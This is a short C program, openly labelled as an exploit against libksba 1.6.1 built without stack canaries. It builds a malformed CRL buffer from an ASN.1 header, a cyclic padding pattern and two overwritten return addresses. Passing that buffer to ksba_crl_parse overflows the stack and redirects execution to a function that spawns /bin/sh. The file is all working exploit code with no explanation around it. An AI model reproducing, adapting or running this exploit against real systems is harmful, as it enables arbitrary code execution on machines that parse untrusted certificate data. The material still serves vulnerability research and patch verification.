#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ksba.h>

// exploit against libksba 1.6.1 (commit: e11e176)
// libksba must have been compiled with no stack canary

void ret() {}

void win() {
    system("/bin/sh");
}

int main() {
    ksba_crl_t crl;
    ksba_crl_new(&crl);

    ksba_reader_t reader;
    ksba_reader_new (&reader);

    char buffer[14+638+8+8] = "\x30\x80\x30\x80\x30\x88\xff\xff\xff\xff\xff\xff\xff\xff";
    memcpy(buffer + 14, "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagja", 638);
    *(unsigned long*)(buffer+14+638) = (unsigned long)ret;
    *(unsigned long*)(buffer+14+638+8) = (unsigned long)win;
    ksba_reader_set_mem (reader, buffer, 14+638+8+8);
    ksba_crl_set_reader(crl, reader);

    ksba_stop_reason_t stop_reason;
    ksba_crl_parse(crl, &stop_reason);
}
